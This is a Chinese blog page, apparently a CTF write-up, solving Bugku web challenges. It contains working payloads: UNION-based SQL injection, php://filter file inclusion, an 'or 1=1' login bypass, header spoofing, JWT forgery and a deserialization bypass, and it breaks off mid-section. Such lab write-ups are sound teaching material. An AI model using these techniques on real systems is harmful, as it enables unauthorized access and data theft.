@@ -1,0 +1,558 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="NEW-bugku-writeupweb1代码审计，变量覆盖 1url?a&#x3D;&amp;b&#x3D;  web2就是一个速算，用脚本跑一下就行了 1234567891011121314151617import requestsurl&#x3D;&amp;#x27;http:&#x2F;&#x2F;123.206.31.85:10002&#x2F;&amp;#x27;s&#x3D;requests.Session()r&#x3D;s.get(url)res&#x3D;r.text.encode">
+<meta property="og:type" content="article">
+<meta property="og:title" content="new_bugku_writeup">
+<meta property="og:url" content="http://example.com/2019/09/11/new-bugku-writeup/index.html">
+<meta property="og:site_name" content="Erlee">
+<meta property="og:description" content="NEW-bugku-writeupweb1代码审计，变量覆盖 1url?a&#x3D;&amp;b&#x3D;  web2就是一个速算，用脚本跑一下就行了 1234567891011121314151617import requestsurl&#x3D;&amp;#x27;http:&#x2F;&#x2F;123.206.31.85:10002&#x2F;&amp;#x27;s&#x3D;requests.Session()r&#x3D;s.get(url)res&#x3D;r.text.encode">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2019/09/11/new-bugku-writeup/NEW-bugku-writeup/006aU7c6ly1g2yujbyg6tj30dy07h3yo.jpg">
+<meta property="og:image" content="http://example.com/2019/09/11/new-bugku-writeup/NEW-bugku-writeup/006aU7c6ly1g2yujbytfqj30x70c040l.jpg">
+<meta property="og:image" content="http://example.com/2019/09/11/new-bugku-writeup/NEW-bugku-writeup/006aU7c6ly1g2yujbzomfj30dv01k0so.jpg">
+<meta property="og:image" content="http://example.com/2019/09/11/new-bugku-writeup/NEW-bugku-writeup/006aU7c6ly1g2yujc6xiij30pw06qglp.jpg">
+<meta property="og:image" content="http://example.com/2019/09/11/new-bugku-writeup/NEW-bugku-writeup/006aU7c6ly1g2yujc1akxj30t309z74u.jpg">
+<meta property="og:image" content="http://example.com/2019/09/11/new-bugku-writeup/NEW-bugku-writeup/006aU7c6ly1g2yujc57tjj30w008q0tt.jpg">
+<meta property="og:image" content="http://example.com/2019/09/11/new-bugku-writeup/NEW-bugku-writeup/006aU7c6ly1g2yujc7zo9j30oo06yt99.jpg">
+<meta property="og:image" content="http://example.com/2019/09/11/new-bugku-writeup/NEW-bugku-writeup/006aU7c6ly1g2yujcdz7jj30ek08vmx3.jpg">
+<meta property="og:image" content="http://example.com/2019/09/11/new-bugku-writeup/NEW-bugku-writeup/006aU7c6ly1g2yujcev61j30hb07tjrr.jpg">
+<meta property="og:image" content="http://example.com/2019/09/11/new-bugku-writeup/NEW-bugku-writeup/web6_1.jpg">
+<meta property="og:image" content="http://example.com/2019/09/11/new-bugku-writeup/NEW-bugku-writeup/006aU7c6ly1g2yujcggwij30py0ejjtj.jpg">
+<meta property="og:image" content="http://example.com/2019/09/11/new-bugku-writeup/NEW-bugku-writeup/006aU7c6ly1g2yujcfig2j313m09tdhd.jpg">
+<meta property="og:image" content="http://example.com/2019/09/11/new-bugku-writeup/NEW-bugku-writeup/006aU7c6ly1g2v62xse87j30ku06h0t5.jpg">
+<meta property="og:image" content="http://example.com/2019/09/11/new-bugku-writeup/NEW-bugku-writeup/006aU7c6ly1g2yujbfn32j312o0ar0un.jpg">
+<meta property="og:image" content="http://example.com/2019/09/11/new-bugku-writeup/NEW-bugku-writeup/006aU7c6ly1g2yujbgyotj30df04fwec.jpg">
+<meta property="og:image" content="http://example.com/2019/09/11/new-bugku-writeup/NEW-bugku-writeup/006aU7c6ly1g2yujblpajj313c0b5taj.jpg">
+<meta property="og:image" content="http://example.com/2019/09/11/new-bugku-writeup/NEW-bugku-writeup/006aU7c6ly1g2yujblx7pj30re0l2ac9.jpg">
+<meta property="og:image" content="http://example.com/2019/09/11/new-bugku-writeup/NEW-bugku-writeup/006aU7c6ly1g2yujbl5hij30by0740sz.jpg">
+<meta property="og:image" content="http://example.com/2019/09/11/new-bugku-writeup/NEW-bugku-writeup/006aU7c6ly1g2yujbp7ooj30m60410sp.jpg">
+<meta property="og:image" content="http://example.com/2019/09/11/new-bugku-writeup/NEW-bugku-writeup/006aU7c6ly1g2yujbt08kj308d05eaa0.jpg">
+<meta property="og:image" content="http://example.com/2019/09/11/new-bugku-writeup/NEW-bugku-writeup/006aU7c6ly1g2yujbt5jtj30ln07rwf1.jpg">
+<meta property="og:image" content="http://example.com/2019/09/11/new-bugku-writeup/NEW-bugku-writeup/006aU7c6ly1g2yujbu76yj30cb04sq2v.jpg">
+<meta property="article:published_time" content="2019-09-11T14:32:06.000Z">
+<meta property="article:modified_time" content="2020-05-07T12:35:19.499Z">
+<meta property="article:author" content="Erlee">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2019/09/11/new-bugku-writeup/NEW-bugku-writeup/006aU7c6ly1g2yujbyg6tj30dy07h3yo.jpg">
+
+<link rel="canonical" href="http://example.com/2019/09/11/new-bugku-writeup/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>new_bugku_writeup | Erlee</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Erlee</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2019/09/11/new-bugku-writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/erlee.png">
+      <meta itemprop="name" content="Erlee">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Erlee">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          new_bugku_writeup
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-09-11 10:32:06" itemprop="dateCreated datePublished" datetime="2019-09-11T10:32:06-04:00">2019-09-11</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-05-07 08:35:19" itemprop="dateModified" datetime="2020-05-07T08:35:19-04:00">2020-05-07</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="NEW-bugku-writeup"><a href="#NEW-bugku-writeup" class="headerlink" title="NEW-bugku-writeup"></a>NEW-bugku-writeup</h1><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><p>代码审计，变量覆盖</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?a=&amp;b=</span><br></pre></td></tr></table></figure>
+
+<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>就是一个速算，用脚本跑一下就行了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=&#x27;http://123.206.31.85:10002/&#x27;</span><br><span class="line">s=requests.Session()</span><br><span class="line">r=s.get(url)</span><br><span class="line">res=r.text.encode(r.encoding).decode()</span><br><span class="line">#print(res)</span><br><span class="line">   #获取网页内容</span><br><span class="line">a=res.find(&quot;(&quot;)</span><br><span class="line">b=res.find(&#x27;)&lt;/div&gt;&#x27;,a) #找到我们要计算的式子的前后位置</span><br><span class="line">num=res[a:b+1]</span><br><span class="line">print(num)</span><br><span class="line">num=eval(num)</span><br><span class="line">print(num)</span><br><span class="line">   #将计算式赋值给一个变量</span><br><span class="line">#r=s.post(url,data=&#123;&#x27;result&#x27;:num&#125;)</span><br><span class="line">   #eval():计算num的值，</span><br><span class="line">#print (r.text.encode(r.encoding).decode())</span><br></pre></td></tr></table></figure>
+
+<h2 id="web3-php伪协议"><a href="#web3-php伪协议" class="headerlink" title="web3 php伪协议"></a>web3 <code>php伪协议</code></h2><p>根据 op 后的传不同的值返回不同页面，可能存在文件包含</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.31.85:10003/?op=f   返回Error  no such page</span><br><span class="line">http://123.206.31.85:10003/?op=flag  返回正常 即存在flag页面</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?op=php://filter/read=convert.base64-encode/resource=flag  base64解码后即可得到flag</span><br></pre></td></tr></table></figure>
+
+<h2 id="web4-万能密码"><a href="#web4-万能密码" class="headerlink" title="web4  万能密码"></a>web4  万能密码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">万能密码登录    &#x27; or 1=1 #  在用户名和密码输入均可</span><br></pre></td></tr></table></figure>
+
+<h2 id="web5-sql注入"><a href="#web5-sql注入" class="headerlink" title="web5  sql注入"></a>web5  sql注入</h2><p>url/?mod=read&amp;id=1   id 是注入点   </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://47.95.208.167:10005/?mod=read&amp;id=-1 union select 1,2,3,group_concat(table_name)  from information_schema.tables where table_schema=database() %23</span><br><span class="line"></span><br><span class="line">http://47.95.208.167:10005/?mod=read&amp;id=-1 union select 1,2,3, group_concat(column_name)  from information_schema.columns where table_schema=database() and table_name= &#x27;flag&#x27; %23</span><br><span class="line"></span><br><span class="line">http://47.95.208.167:10005/?mod=read&amp;id=-1 union select 1,2,3, flag from flag %23</span><br></pre></td></tr></table></figure>
+
+<h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><p>查看源代码注意到右面滑条 ，于是拉倒低端，发现一串字符   <code>&lt;!-- dGVzdDEyMw== --&gt;</code>  base64解密之后  <code>test123</code>  在根据<strong>提示只允许本地管理员</strong>登录 尝试  admin   test123   并修改访问头   添加   </p>
+<p><strong>X-Forwarded-For: 127.0.0.1</strong></p>
+<p><img src="NEW-bugku-writeup/006aU7c6ly1g2yujbyg6tj30dy07h3yo.jpg"></p>
+<p><img src="NEW-bugku-writeup/006aU7c6ly1g2yujbytfqj30x70c040l.jpg"></p>
+<h2 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h2><p>根据题目提示 与cookies有关  输入admin   admin  成功进去（随意注册一个也行）刷新抓包</p>
+<p><img src="NEW-bugku-writeup/006aU7c6ly1g2yujbzomfj30dv01k0so.jpg"></p>
+<p>cookies中，u和r的值只有后面不一样，截取不一样的部分进行MD5解密</p>
+<p><strong>u后面的值解密</strong></p>
+<p><img src="NEW-bugku-writeup/006aU7c6ly1g2yujc6xiij30pw06qglp.jpg"></p>
+<p><strong>r后面MD5 解密后</strong></p>
+<p><img src="NEW-bugku-writeup/006aU7c6ly1g2yujc1akxj30t309z74u.jpg"></p>
+<p>在bp里面将r的值替换为u的值提交发包即可得到flag</p>
+<h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><p>提示是SQL注入   </p>
+<p>找注入点，由于age是数字型 不用考虑引号闭合，尝试注入  ，表单提交验证在update.php (抓包的时候就可以发现)，每次操作都要更新一下taken值 (审查元素即可得到taken )，每次的返回值也要去审查元素里面找</p>
+<p><img src="NEW-bugku-writeup/006aU7c6ly1g2yujc57tjj30w008q0tt.jpg"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">nickname=Lamber%27123&amp;age=(select group_concat(schema_name) from information_schema.schemata)&amp;description=users213213&amp;token=8df7c9a1ddabfc6f8b5e9a42571656b9</span><br><span class="line"># 得到information_schema,web8</span><br><span class="line"></span><br><span class="line">nickname=Lamber%27123&amp;age=(select group_concat(table_name) from information_schema.tables where table_schema=database())&amp;description=users213213&amp;token=0b22b45bcea23019fb75625fbcbabefd</span><br><span class="line">#得到一张表  users</span><br><span class="line"></span><br><span class="line">nickname=Lamber%27123&amp;age=(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x7573657273)&amp;description=users213213&amp;token=4ac637c081b03611c0fed94a0282974d</span><br><span class="line">#所有列  id,username,password,nickname,age,description</span><br><span class="line"></span><br><span class="line">nickname=Lamber%27123&amp;age=(select group_concat(username) from (select * from users )x)&amp;description=users213213&amp;token=250faaa4f220ddfb3fed6a8213160014</span><br><span class="line"># 逐一查看列值 无flag        我做的时候题被谁改了 emmmmmmm </span><br><span class="line">搜索网上其他的wp，本来应该在description 这一列的</span><br></pre></td></tr></table></figure>
+
+<h2 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h2><p>如图</p>
+<p><img src="NEW-bugku-writeup/006aU7c6ly1g2yujc7zo9j30oo06yt99.jpg"> </p>
+<p>将返回的值base64解密即可</p>
+<h2 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h2><p>进入后 ，查看源码得到 <code>&lt;!--hint:NNVTU23LGEZDG===--&gt; </code> base64解密后  kk ： kk123  登陆</p>
+<p><img src="NEW-bugku-writeup/006aU7c6ly1g2yujcdz7jj30ek08vmx3.jpg"></p>
+<p>根据提示（vim异常退出会临时保存文件）存在文件泄露，这个可以直接查看网站目录 </p>
+<p><img src="NEW-bugku-writeup/006aU7c6ly1g2yujcev61j30hb07tjrr.jpg"></p>
+<p>下载L3yx.php.swp  在Linux里面还原文件得到源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;/&gt;</span><br><span class="line">&lt;title&gt;在线日记本&lt;/title&gt;</span><br><span class="line">&lt;form action=&quot;&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">  &lt;p&gt;username: &lt;input type=&quot;text&quot; name=&quot;username&quot; /&gt;&lt;/p&gt;</span><br><span class="line">  &lt;p&gt;password: &lt;input type=&quot;password&quot; name=&quot;password&quot; /&gt;&lt;/p&gt;</span><br><span class="line">  &lt;input type=&quot;submit&quot; value=&quot;login&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;!--hint:NNVTU23LGEZDG===--&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    require_once &#x27;src/JWT.php&#x27;;</span><br><span class="line"></span><br><span class="line">    const KEY = &#x27;L3yx----++++----&#x27;;</span><br><span class="line"></span><br><span class="line">    function loginkk()</span><br><span class="line">    &#123;</span><br><span class="line">        $time = time();</span><br><span class="line">        $token = [</span><br><span class="line">          &#x27;iss&#x27;=&gt;&#x27;L3yx&#x27;,</span><br><span class="line">          &#x27;iat&#x27;=&gt;$time,</span><br><span class="line">          &#x27;exp&#x27;=&gt;$time+5,</span><br><span class="line">          &#x27;account&#x27;=&gt;&#x27;kk&#x27;</span><br><span class="line">        ];</span><br><span class="line">        $jwt = \Firebase\JWT\JWT::encode($token,KEY);</span><br><span class="line">        setcookie(&quot;token&quot;,$jwt);</span><br><span class="line">        header(&quot;location:user.php&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(isset($_POST[&#x27;username&#x27;]) &amp;&amp; isset($_POST[&#x27;password&#x27;]) &amp;&amp; $_POST[&#x27;username&#x27;]!=&#x27;&#x27; &amp;&amp; $_POST[&#x27;password&#x27;]!=&#x27;&#x27;)</span><br><span class="line">    &#123;</span><br><span class="line">        if($_POST[&#x27;username&#x27;]==&#x27;kk&#x27; &amp;&amp; $_POST[&#x27;password&#x27;]==&#x27;kk123&#x27;)</span><br><span class="line">        &#123;</span><br><span class="line">            loginkk();</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            echo &quot;账号或密码错误&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<p>到这里</p>
+<p><a href="NEW-bugku-writeup/https://learnku.com/articles/10885/full-use-of-jwt#b363e1">记得先了解一下jwt是什么再做题</a></p>
+<p><a href="NEW-bugku-writeup/https://tool.lu/timestamp/">linux时间戳在线转化</a>  </p>
+<p>每次的登录后，就验证有效期就5秒，登录后就立即刷新留言页面  用bp抓包，进行jwt伪造</p>
+<p><img src="NEW-bugku-writeup/web6_1.jpg"></p>
+<p>将上方框起来的复制到下面  这个<a href="NEW-bugku-writeup/https://jwt.io/">网站</a>在线进行jwt还原</p>
+<p><img src="NEW-bugku-writeup/006aU7c6ly1g2yujcggwij30py0ejjtj.jpg" alt="1557568439650"></p>
+<p>粘贴到bp里，到预定的时间提交就行了</p>
+<p><img src="NEW-bugku-writeup/006aU7c6ly1g2yujcfig2j313m09tdhd.jpg"></p>
+<h2 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h2><p>进去之后看到 网站标题是robots 之间进 robots.txt 查看  给出一个页面吧地址   /shell.php</p>
+<p><img src="NEW-bugku-writeup/006aU7c6ly1g2v62xse87j30ku06h0t5.jpg" alt="1557580412161"></p>
+<p>直接上脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">url = &#x27;http://123.206.31.85:3030/shell.php&#x27;</span><br><span class="line">s = requests.Session()</span><br><span class="line">r = s.get(url)</span><br><span class="line">res = r.text.encode(r.encoding).decode()</span><br><span class="line"></span><br><span class="line">a = res.find(&#x27;) =&#x27;)#获取目标位置的位置</span><br><span class="line">b = res.find(&#x27;&lt;&#x27;, a)</span><br><span class="line">res_md5 = res[a+4:b]#截取获得md5字符串</span><br><span class="line">#print(res_md5)</span><br><span class="line">for i in range(100000000000):</span><br><span class="line">    str_md5 = hashlib.md5(str(i).encode(encoding=&#x27;utf-8&#x27;)).hexdigest()</span><br><span class="line">    if str_md5[:6] == res_md5:</span><br><span class="line">        url = &quot;http://123.206.31.85:3030/shell.php?password=&#123;&#125;&quot;.format(i)</span><br><span class="line">        r = s.get(url)</span><br><span class="line">        print(r.text)</span><br><span class="line">        break</span><br><span class="line">        #print(i)</span><br><span class="line">#运行即可得到flag       </span><br><span class="line">#flag&#123;e2f86fb5f7********f4957d89aaca0&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h2><p>查看源码，php反序列化，另外还有绕过wakeup() </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">class Time&#123;</span><br><span class="line">	public $flag = ******************;</span><br><span class="line">	public $truepassword = ******************;</span><br><span class="line">	public $time;</span><br><span class="line">	public $password ;</span><br><span class="line">	public function __construct($tt, $pp) &#123;</span><br><span class="line">    $this-&gt;time = $tt;</span><br><span class="line">    $this-&gt;password = $pp;</span><br><span class="line">    &#125;</span><br><span class="line">	function __destruct()&#123;</span><br><span class="line">		if(!empty($this-&gt;password))</span><br><span class="line">		&#123;</span><br><span class="line">			if(strcmp($this-&gt;password,$this-&gt;truepassword)==0)&#123;</span><br><span class="line">				echo &quot;&lt;h1&gt;Welcome,you need to wait......&lt;br&gt;The flag will become soon....&lt;/h1&gt;&lt;br&gt;&quot;;</span><br><span class="line">				if(!empty($this-&gt;time))&#123;</span><br><span class="line">					if(!is_numeric($this-&gt;time))&#123;</span><br><span class="line">						echo &#x27;Sorry.&lt;br&gt;&#x27;;</span><br><span class="line">						show_source(__FILE__);</span><br><span class="line">					&#125;</span><br><span class="line">					else if($this-&gt;time &lt; 11 * 22 * 33 * 44 * 55 * 66)&#123;</span><br><span class="line">						echo &#x27;you need a bigger time.&lt;br&gt;&#x27;;</span><br><span class="line">					&#125;</span><br><span class="line">					else if($this-&gt;time &gt; 66 * 55 * 44 * 33 * 23 * 11)&#123;</span><br><span class="line">						echo &#x27;you need a smaller time.&lt;br&gt;&#x27;;</span><br><span class="line">					&#125;</span><br><span class="line">					else&#123;</span><br><span class="line">						sleep((int)$this-&gt;time);</span><br><span class="line">						var_dump($this-&gt;flag);</span><br><span class="line">					&#125;</span><br><span class="line">					echo &#x27;&lt;hr&gt;&#x27;;</span><br><span class="line">				&#125;</span><br><span class="line">				else&#123;</span><br><span class="line">					echo &#x27;&lt;h1&gt;you have no time!!!!!&lt;/h1&gt;&lt;br&gt;&#x27;;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			else&#123;</span><br><span class="line">				echo &#x27;&lt;h1&gt;Password is wrong............&lt;/h1&gt;&lt;br&gt;&#x27;;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		else&#123;</span><br><span class="line">			echo &quot;&lt;h1&gt;Please input password..........&lt;/h1&gt;&lt;br&gt;&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	function __wakeup()&#123;</span><br><span class="line">		$this-&gt;password = 1; echo &#x27;hello hacker,I have changed your password and time, rua!&#x27;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#x27;rua&#x27;]))&#123;</span><br><span class="line">	$rua = $_GET[&#x27;rua&#x27;];</span><br><span class="line">	@unserialize($rua);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">	echo &quot;&lt;h1&gt;Please don&#x27;t stop rua 233333&lt;/h1&gt;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">--!&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>绕过时间 16进制绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a=11 * 22 * 33 * 44 * 55 * 66</span><br><span class="line">b=66 * 55 * 44 * 33 * 23 * 11</span><br><span class="line"></span><br><span class="line">c=hex(a+1)</span><br><span class="line">print(c)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>反序列化</p>
